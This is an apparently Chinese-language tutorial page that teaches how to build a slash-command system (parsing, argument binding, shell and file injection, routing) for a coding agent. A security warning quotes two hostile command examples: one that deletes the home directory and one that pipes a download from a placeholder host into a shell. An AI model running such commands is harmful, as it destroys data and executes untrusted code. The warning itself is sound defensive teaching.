@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>02 · Slash 命令与动态注入</title>
+<link rel="stylesheet" href="../assets/style.css">
+<script>
+  window.MathJax = { tex: { inlineMath: [['$','$'],['\\(','\\)']], displayMath: [['$$','$$'],['\\[','\\]']] } };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script>
+</head>
+<body>
+
+<div class="topbar"><div class="inner">
+  <a class="home" href="../index.html">⌂ 课程主页</a>
+  <a href="../glossary.md">术语词典</a>
+  <a href="../references.md">论文清单</a>
+  <span class="spacer"></span>
+  <span style="color:var(--fg-dim)">MODULE 02 / 06</span>
+</div></div>
+
+<div class="wrap">
+
+  <h1>02 · Slash 命令与动态注入</h1>
+  <p class="subtitle">用户显式触发的能力入口 —— 命令解析、参数绑定（$ARGUMENTS/$1）、动态注入（!`shell`/@file）、命令路由与扩展；从零写解析器 + 绑定器 + 动态注入器 + 路由器，对接 MockLLM 端到端跑通</p>
+
+  <div class="meta-box">
+    <div class="item"><div class="k">前置知识</div><div class="v">模块 00/01、markdown 与 frontmatter、shell 命令与管道的直觉、Python re/shlex</div></div>
+    <div class="item"><div class="k">配套 notebook</div><div class="v"><span class="badge cpu">CPU</span> 02_slash_commands.ipynb</div></div>
+    <div class="item"><div class="k">核心文档</div><div class="v">Claude Code Slash commands / Plugins、MCP prompts</div></div>
+    <div class="item"><div class="k">预计时长</div><div class="v">读 55 分钟 + 跑 45 分钟</div></div>
+  </div>
+
+  <div class="toc">
+    <h3>本章地图</h3>
+    <ol>
+      <li><a href="#why">为什么需要用户显式触发的命令</a></li>
+      <li><a href="#shape">slash 命令长什么样：带 frontmatter 的模板</a></li>
+      <li><a href="#parse">第一步：解析（拆名字与参数）</a></li>
+      <li><a href="#bind">第二步：绑定（填占位符）</a></li>
+      <li><a href="#inject">第三步：动态注入（嵌实时上下文）</a></li>
+      <li><a href="#route">第四步：路由（分发到处理器）</a></li>
+      <li><a href="#agent">把命令接进 agent</a></li>
+      <li><a href="#frontier">研究前沿与开放问题</a></li>
+    </ol>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="why"><span class="num">1</span>为什么需要用户显式触发的命令</h2>
+  <p>上一模块的 <span class="term">skill</span> 是<strong>模型自动触发</strong>的能力：模型读 description 自己判断「这个 skill 跟当前任务相关吗」，相关才加载正文。本模块讲另一条能力入口——<span class="term">slash 命令</span>，它是<strong>用户显式触发</strong>的：用户敲下 <code>/review src/app.py</code>，就主动激活一段预设的工作流。两条入口一被动一主动，覆盖了「让能力被用上」的两种根本方式，缺一不可。</p>  <p>为什么需要用户显式触发的这一条？因为有些动作<strong>不该等模型「悟」出来</strong>：「跑一遍我的代码评审清单」「按团队规范写一条提交信息」「把这个文件总结成三句话」——这些是<em>用户心里早有的、重复发生的固定流程</em>，与其每次靠自然语言把流程讲一遍、再赌模型理解对，不如<strong>固化成一条命令</strong>：一个名字、一个 prompt 模板、几个参数占位符，敲一下就展开成完整的、带实时上下文的指令。这正是 Claude Code 里 <code>.claude/commands/</code> 下那些 <code>/</code>-命令在做的事。</p>  <p>本模块的目标是<strong>从零写出 slash 命令系统的完整链路</strong>：一行 <code>/cmd 参数...</code> 文本如何被<strong>解析</strong>成命令名与参数、参数如何<strong>绑定</strong>进模板的占位符（<code>$ARGUMENTS</code> / <code>$1</code> / <code>$2</code>）、如何把「运行时才知道的内容」<strong>动态注入</strong>进 prompt（<code>!`shell`</code> 注入命令输出、<code>@file</code> 注入文件内容）、以及如何把命令<strong>路由</strong>到对应处理器。我们用 MockLLM 当模型，把整条链路端到端跑通——你会看到，Claude Code 的命令系统不过是给这套逻辑加了文件约定与更丰富的占位符。</p>  <p>还要点出一个常被混淆的关系：slash 命令<strong>不是工具，也不是 skill，而是「prompt 的生成器」</strong>。它的输出不是「执行结果」，而是一段<em>展开后的纯文本 prompt</em>——这段 prompt 再发给模型，由模型决定怎么推理、调哪些工具。理解这条边界很重要：它意味着 slash 命令系统可以<strong>完全独立于模型与工具来开发和测试</strong>（你只需断言「这条命令展开成了正确的 prompt」），而下游的模型调用、工具分发对「这段 prompt 是手打的还是命令展开的」毫不知情。这种解耦正是它能作为一个独立子系统、不依赖框架地从零造出来的根本原因。</p>  <div class="callout intuition"><span class="label"></span>
+    <p>一句话抓住本模块：<strong>slash 命令 = 把一段「用户常重复的工作流」固化成「带占位符 + 动态注入的 prompt 模板」，敲一下就展开成完整指令</strong>。本模块的全部工程，都是在让这套「解析 → 绑定 → 注入 → 路由 → 展开」的流程<em>可靠、可扩展、注入实时上下文而不出错</em>。难点不在「调用模型」那一行，而在它前面的文本处理与分发。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="shape"><span class="num">2</span>slash 命令长什么样：带 frontmatter 的模板</h2>
+  <h3>slash 命令长什么样：带 frontmatter 的模板</h3>  <p>一个 slash 命令在 Claude Code 里就是一个<strong>带 frontmatter 的 markdown 文件</strong>，放在 <code>.claude/commands/</code>（项目级）或插件里。文件名即命令名（<code>review.md</code> → <code>/review</code>），正文是一个<strong>带占位符的 prompt 模板</strong>：</p>  <pre><code># 文件: .claude/commands/review.md  -&gt;  命令 /review
+---
+description: 对指定文件做代码评审
+argument-hint: &lt;file&gt;
+---
+请评审文件 $1。下面是它当前的 diff:
+!`git diff $1`
+评审清单见 @docs/review-checklist.md，逐条对照给出意见。</code></pre>  <p>拆开看三件东西：<strong>①</strong> <span class="term">frontmatter</span>（<code>---</code> 包裹，含 <code>description</code>、<code>argument-hint</code> 等元数据，用于命令列表展示与提示）；<strong>②</strong> <strong>参数占位符</strong>（<code>$1</code> 表示第 1 个位置参数、<code>$ARGUMENTS</code> 表示全部参数）；<strong>③</strong> <strong>动态注入标记</strong>（<code>!`...`</code> 把一条 shell 命令的输出嵌进来、<code>@path</code> 把一个文件的内容嵌进来）。</p>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>把命令文件想成一张「填空 + 现场取材」的工单模板：<code>$1</code> 是要你填的空（评审哪个文件），<code>!`git diff`</code> 是「去现场拍张照贴上来」（把当前 diff 取来），<code>@checklist</code> 是「把那份清单附上」。模板写好，敲一次命令就自动填空、取材、附件，生成一份完整工单交给模型。</p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式上，命令模板与 skill 文件结构同源（都是 frontmatter + markdown 正文），但语义正交：skill 由<em>模型</em>按相关性自动注入、不带参数；slash 命令由<em>用户</em>显式调用、带参数且支持动态注入。本课模块 01 写的 frontmatter 解析器<strong>可以直接复用</strong>在这里——这正是「不依赖框架、零件可复用」的体现。</p></div>
+  </div>  <p>一个常被忽视的点：<strong>命令模板是给模型看的最终 prompt 的「半成品」</strong>。它本身不被执行，而是经过「绑定参数 + 展开注入」后，变成一段纯文本 prompt，再发给模型。所以 slash 命令系统的产物是<em>一段展开后的 prompt</em>，而不是「执行结果」——执行交给模型和它后续调用的工具。</p>
+
+  <!-- ========================================================= -->
+  <h2 id="parse"><span class="num">3</span>第一步：解析（拆名字与参数）</h2>
+  <h3>第一步：解析 —— 把一行命令拆成名字与参数</h3>  <p>用户输入的是一行文本，如 <code>/review src/app.py "fix login bug"</code>。解析要做三件事：判断这是不是 slash 命令（以 <code>/</code> 开头）、取出<strong>命令名</strong>、把剩下的拆成<strong>参数列表</strong>。</p>  <p>拆参数的难点是<strong>带引号的参数要当作一个整体</strong>：<code>"fix login bug"</code> 是一个参数，不是三个。手写空白切分会拆错，正确做法是用标准库 <span class="term">shlex</span> ——它是「shell 词法分析器」，天然懂引号与转义：</p>  <pre><code>import shlex
+def parse_command(line):
+    line = line.strip()
+    if not line.startswith("/"):
+        return None                      # 不是 slash 命令
+    body = line[1:]                       # 去掉前导 /
+    parts = shlex.split(body)             # 懂引号: ["review","src/app.py","fix login bug"]
+    if not parts:
+        return None
+    return {"name": parts[0], "args": parts[1:]}</code></pre>  <p>注意 <code>shlex.split</code> 把 <code>review src/app.py "fix login bug"</code> 正确切成 <code>["review", "src/app.py", "fix login bug"]</code>：第一个是命令名，其余是参数，且带引号的整体被保留。解析器只负责<em>切词</em>，不判断命令存不存在——那是路由的职责（第 6 节）。这种「解析与路由分离」让每一步都能单独测试。</p>  <p>为什么不自己写一个空白切分？因为「正确地切词」这件事比想象中难：引号内的空格不能切、转义字符（<code>\"</code>）要保留、连续空格要合并。这些规则正是 shell 几十年沉淀下来的，<code>shlex</code> 把它们一次性给了你——这是「用标准库而非重造轮子」的典型例子。本课「不依赖框架」不等于「什么都从零写」：协议与控制流要亲手造（那是要理解的东西），而切词、JSON 编解码这类<em>有成熟标准库的底层工具</em>该大胆复用，把精力留给真正的设计。</p>  <div class="callout warn"><span class="label"></span>
+    <p>解析阶段最容易踩的坑是<strong>把空输入、纯 /、或残缺引号当成正常命令</strong>。<code>/</code> 后面没有名字、或引号不闭合（<code>/x "unclosed</code>）都应被识别为非法输入，返回明确的「无法解析」而非崩溃。本课的解析器对空/纯斜杠返回 <code>None</code>、对残缺引号捕获 <code>shlex</code> 抛出的 <code>ValueError</code> 并报错。<em>把异常输入挡在入口，是命令系统鲁棒性的第一关</em>。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="bind"><span class="num">4</span>第二步：绑定（填占位符）</h2>
+  <h3>第二步：绑定 —— 把参数填进占位符</h3>  <p>解析出 <code>args = ["src/app.py", "fix login bug"]</code> 后，要把它们填进模板的占位符。Claude Code 约定三类占位符，本课全部从零实现：</p>  <table>
+    <thead><tr><th>占位符</th><th>含义</th><th>对 args=["a", "b c"] 展开为</th></tr></thead>
+    <tbody>
+      <tr><td><code>$ARGUMENTS</code></td><td>全部参数拼成一个字符串</td><td><code>a b c</code></td></tr>
+      <tr><td><code>$1</code></td><td>第 1 个位置参数</td><td><code>a</code></td></tr>
+      <tr><td><code>$2</code></td><td>第 2 个位置参数</td><td><code>b c</code></td></tr>
+      <tr><td><code>$3</code> 等</td><td>第 N 个（越界时填空串）</td><td><code>(空)</code></td></tr>
+    </tbody>
+  </table>  <p>绑定就是一次<strong>有先后顺序的字符串替换</strong>：<strong>先</strong>替换 <code>$ARGUMENTS</code>（最长的标记，避免被 <code>$1</code> 的规则误伤）、<strong>再</strong>替换 <code>$1</code>/<code>$2</code>/… 这些位置参数。用 <span class="term">re</span> 一次性把所有 <code>$&lt;数字&gt;</code> 替换掉最稳妥：</p>  <pre><code>import re
+def bind_args(template, args):
+    out = template.replace("$ARGUMENTS", " ".join(args))
+    def repl(m):
+        i = int(m.group(1))                # $1 -&gt; args[0]
+        return args[i-1] if 1 &lt;= i &lt;= len(args) else ""
+    return re.sub(r"\$(\d+)", repl, out)  # 越界的位置参数填空串</code></pre>  <p>两个设计细节值得点出：<strong>①</strong> 越界的位置参数（模板写了 <code>$3</code> 但只给了 2 个参数）应<em>填空串</em>而非报错——模板作者常预留可选参数；<strong>②</strong> 替换顺序很重要：若先处理 <code>$1</code> 再处理 <code>$ARGUMENTS</code> 不会有问题（它们不重叠），但若有 <code>$10</code> 这样的多位数，正则 <code>\$(\d+)</code> 会正确地整体匹配 <code>10</code> 而不是误当成 <code>$1</code> 加字面 <code>0</code>。从零写时这些边界要亲手验证。</p>  <p>绑定看似只是字符串替换，却藏着「模板语言设计」的雏形。一旦你想支持<em>默认值</em>（<code>${1:-main}</code>，缺参时回退）、<em>具名参数</em>、甚至<em>条件块</em>，绑定器就从「几行 replace」长成一个小型模板引擎。本课只实现位置参数 + <code>$ARGUMENTS</code> 这个最小够用的子集（练习里你会亲手加默认值），但要心里有数：真实系统的命令模板语言往往更丰富，而它们的内核都是「把运行时的值，按规则填进静态模板的占位符」——和你这里写的是同一回事。</p>
+
+  <!-- ========================================================= -->
+  <h2 id="inject"><span class="num">5</span>第三步：动态注入（嵌实时上下文）</h2>
+  <h3>第三步：动态注入 —— 把实时上下文嵌进 prompt</h3>  <p>绑定参数后，模板里还可能有两类<strong>动态注入标记</strong>，要在展开时把「运行时内容」取来嵌入。这是 slash 命令比静态模板强大的地方——它能携带<em>此刻</em>的上下文：</p>  <ul>
+    <li><span class="term">bang 命令</span> <code>!`&lt;shell&gt;`</code>：执行其中的 shell 命令，把它的 <strong>stdout</strong> 注入到此处。例：<code>!`git diff`</code> 把当前 diff 嵌进来。</li>
+    <li><span class="term">文件引用</span> <code>@&lt;path&gt;</code>：把该文件的 <strong>内容</strong> 注入到此处。例：<code>@README.md</code> 把 README 嵌进来。</li>
+  </ul>  <div class="ascii">   /review src/app.py
+        │ 解析
+        ▼
+   {name:'review', args:['src/app.py']}
+        │ 绑定 $1 -&gt; src/app.py
+        ▼
+   '请评审 src/app.py。diff:\n!`git diff src/app.py`\n清单:@docs/checklist.md'
+        │ 动态注入: 执行 git diff (stdout) + 读文件内容
+        ▼
+   '请评审 src/app.py。diff:\n&lt;真实 diff 文本&gt;\n清单:&lt;清单文件内容&gt;'   ← 展开后的最终 prompt</div>  <p>实现上，注入就是<strong>用正则找到标记、求值、替换</strong>：<code>!`...`</code> 用 <code>!`([^`]+)`</code> 匹配，把括号里的命令交给一个<strong>执行器</strong>求值；<code>@path</code> 用 <code>@(\S+)</code> 匹配，把路径交给一个<strong>读取器</strong>求值。关键设计是<strong>把「怎么执行 / 怎么读」做成可注入的回调</strong>（依赖注入），而不是写死调用 <code>subprocess</code>：这样测试时可以传一个<em>确定性的假执行器</em>，生产时再换成真的——既安全又可测。</p>  <p>这个「把副作用做成可注入回调」的手法，是本课反复用到的核心工程纪律，值得专门记住：凡是涉及<em>跑命令、读文件、调网络、调模型</em>这些不确定或有副作用的操作，都把它们<strong>从核心逻辑里拎出来、做成参数传进去</strong>。好处有三：核心逻辑（这里是「找标记、替换」）变成纯函数，可被确定性地断言；测试时注入假桩，绝不触发真实副作用；生产时注入真实现实，一行不改。模块 00 的 <code>make_llm</code>（把模型做成可换的回调）、本节的 <code>runner</code>/<code>reader</code> 都是同一招——这正是为什么本课能在没有真实 shell、没有真实模型的环境里，仍然把每个零件验证到位。</p>  <div class="callout danger"><span class="label">!`shell` 是任意命令执行，注入即风险</span>
+    <p>动态注入是<strong>最大的安全风险点</strong>，务必警惕：<code>!`shell`</code> 会执行任意命令。如果命令模板来自<em>不可信来源</em>（别人分享的插件、被篡改的文件），一条 <code>!`rm -rf ~`</code> 或 <code>!`curl evil|sh`</code> 就是灾难。真实系统必须：<strong>只信任可信来源的命令、对 shell 注入加白名单或确认、限制可执行的命令集、用受限权限运行</strong>。本课的执行器刻意做成<em>白名单 + 确定性桩</em>——既能端到端验证逻辑，又绝不真的执行危险命令。<strong>便利与风险在动态注入这里是一体两面</strong>。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="route"><span class="num">6</span>第四步：路由（分发到处理器）</h2>
+  <h3>第四步：路由 —— 把命令分发到处理器</h3>  <p>有了解析、绑定、注入，最后要把一条命令<strong>路由</strong>到对应的处理逻辑。核心数据结构是一个<span class="term">命令注册表</span>：把「命令名 → 命令定义（模板 + 元数据）」存成一张表，解析出名字后查表、绑定、展开。</p>  <pre><code>class CommandRouter:
+    def __init__(self):
+        self.commands = {}                      # name -&gt; {template, meta}
+    def register(self, name, template, meta=None):
+        self.commands[name] = {"template": template, "meta": meta or {}}
+    def dispatch(self, line, runner, reader):
+        parsed = parse_command(line)
+        if parsed is None:
+            return {"ok": False, "error": "无法解析的命令"}
+        name = parsed["name"]
+        if name not in self.commands:
+            return {"ok": False, "error": f"未知命令: /{name}"}   # 挡住打错的命令
+        tmpl = self.commands[name]["template"]
+        bound = bind_args(tmpl, parsed["args"])
+        prompt = inject_dynamic(bound, runner, reader)            # 展开 !`` 与 @
+        return {"ok": True, "prompt": prompt}</code></pre>  <p>路由器的<strong>纪律</strong>和工具分发器一样：无论是无法解析、未知命令、还是注入时出错，它都<strong>返回一个结构化结果（带 ok 标志）而非抛异常</strong>。这把「错误」从「程序崩溃」降级为「一次可处理的返回」，让上层 UI 能优雅地提示「未知命令 /reviw，你是不是想打 /review？」。</p>  <p>注册表这个抽象还带来<strong>命名空间</strong>与<strong>可扩展性</strong>：命令可以按来源分组加前缀（<code>/git:commit</code>、<code>/project:deploy</code>），避免重名；加一个新命令只需 <code>register</code> 一下，路由代码一行不改。下一模块的插件（模块 04）正是靠把自己的命令 <code>register</code> 进这张表来扩展 agent——<strong>注册表是「可扩展性」的承重结构</strong>，从 skill（01）到命令（02）到工具（03/05）到插件（04），同一种「注册表 + 分发」的模式反复出现。</p>  <p>路由还要回答一个现实问题：<strong>内置命令 vs 自定义命令的优先级</strong>。<code>/help</code>、<code>/clear</code> 这类由 harness 硬编码的内置命令，与用户/插件提供的命令模板共处一张表时，谁覆盖谁？常见策略是「内置优先、或允许自定义显式覆盖」。本课聚焦核心分发逻辑，但你应当意识到：随着命令来源变多（内置、项目、用户、各插件），路由器还要承担<em>冲突裁决</em>与<em>来源标注</em>的职责——这也是为什么注册表里每条命令都该带元数据（来源、描述），而不只是一个模板字符串。</p>
+
+  <!-- ========================================================= -->
+  <h2 id="agent"><span class="num">7</span>把命令接进 agent</h2>
+  <h3>把命令接进 agent：展开后的 prompt 交给模型</h3>  <p>slash 命令系统的产物是<strong>一段展开后的 prompt</strong>。它接进 agent 的方式很直接：把这段 prompt 当作用户消息发给模型，模型据此推理、可能调用工具、给出回应。回到模块 00 那条流水线，slash 命令是<strong>另一条「选择 + 注入」的入口</strong>——只不过「选择」是用户显式做的（敲哪个命令），「注入」是模板的动态展开。</p>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>打个比方：skill 像「助理看你在忙什么、悄悄把相关手册翻到对应页递给你」；slash 命令像「你直接喊『给我跑一遍上线检查单』，助理立刻拿出那张单子、填上今天的日期和服务器名、附上最新日志，递到你手上」。两种都让能力被用上，一个靠默契、一个靠明令。</p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式上，展开后的 prompt 与任何普通用户输入<strong>没有区别</strong>——这正是 slash 命令优雅的地方：它只是 prompt 的「生成器」，下游的模型调用、工具分发完全不必知道这段 prompt 是手打的还是命令展开的。所以你在模块 00 写的 <code>make_llm</code>（无 key 回退 MockLLM）<strong>原样适用</strong>：把展开后的 prompt 喂进去即可。</p></div>
+  </div>  <p>这里也要点出 slash 命令与 skill 在 agent 循环里的<strong>协同</strong>：用户敲一条 <code>/review</code> 命令展开出 prompt，这段 prompt 进入循环后，可能<em>又触发了相关 skill</em>（模型读到「评审」任务、激活了一份「代码评审规范」skill 的正文）。也就是说，显式触发（命令）与自动触发（skill）<strong>并不互斥，而是叠加</strong>：命令决定「这一轮要做什么」，skill 补充「这类事该怎么做好」。模块 05 的完整系统会把这两条入口接在同一个循环里，让它们自然地协同——这正是「把零件组装成系统」相对「单个零件」的价值。</p>  <p>本模块 notebook 会把这条接法跑通：注册几个命令 → 用户敲命令 → 解析、绑定、动态注入得到 prompt → 喂给 MockLLM → 拿到（确定性的）回应或工具调用。并旁附真实 Claude 适配：同一段展开后的 prompt，换成 <code>messages.create(model="claude-sonnet-4-6", ...)</code> 即可——有 key 走真实模型、无 key 自动回退 MockLLM，逻辑一行不改。</p>
+
+  <!-- ========================================================= -->
+  <h2 id="frontier"><span class="num">8</span>研究前沿与开放问题</h2>
+  <h3>研究前沿与开放问题</h3>  <ul>
+    <li><strong>命令的安全边界</strong>：<code>!`shell`</code> 的任意命令执行是最大的攻击面。如何在「方便注入实时上下文」与「不被恶意命令模板劫持」之间取得平衡——命令来源签名、shell 白名单、沙箱执行、对高危命令要求确认——是把 slash 命令推向「敢装别人的命令」的关键。</li>
+    <li><strong>参数的结构化与校验</strong>：当前参数是裸字符串位置绑定。更前沿的方向是给命令声明<em>带类型的参数 schema</em>（像工具的 input_schema），在绑定前校验、并给模型/用户更好的补全提示——让命令从「字符串模板」走向「带契约的接口」。</li>
+    <li><strong>slash 命令 vs skill vs MCP prompt 的统一</strong>：三者都是「把一段意图变成 prompt/动作」。MCP server 暴露的 prompt 模板（模块 03）可以直接呈现为 host 的 slash 命令；skill 与命令也在收敛。如何用一套统一模型表达「可触发的能力」，是生态层的活跃问题（模块 05 会体现这种打通）。</li>
+    <li><strong>动态注入的可观测与成本</strong>：<code>!`shell`</code> 和 <code>@file</code> 可能注入海量内容（一个大 diff、一个大文件），瞬间撑爆上下文。如何对注入内容做<em>预算控制、截断、摘要</em>（与模块 01 的 token 预算同构），是让动态注入实用的工程难点。</li>
+    <li><strong>命令的发现与组合</strong>：当命令多达上百个，如何让用户发现它们（<code>/help</code> 的智能化）、如何让一个命令调用另一个命令（命令组合）、如何把常用命令序列固化——这些把命令系统从「一堆快捷方式」推向「可编程的工作流层」。</li>
+  </ul>  <div class="callout paper"><span class="label"></span>
+    <p>必读：Claude Code Slash commands 文档（命令文件、<code>$ARGUMENTS</code>/<code>!`shell`</code>/<code>@file</code>、命名空间）、Claude Code Plugins 文档（插件如何提供命令）、以及 MCP 规范里的 prompts（server 暴露的 prompt 模板如何变成 host 的命令）。清单见 <code>references.md</code>。</p>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="../01_skill_loading/01_讲解.html"><div class="dir">← 上一模块</div><div class="t">01 · Skill 定义与加载</div></a>
+    <a class="next" href="../03_mcp_server/03_讲解.html"><div class="dir">下一模块 →</div><div class="t">03 · 从零造 MCP Server</div></a>
+  </div>
+
+</div>
+</body>
+</html>
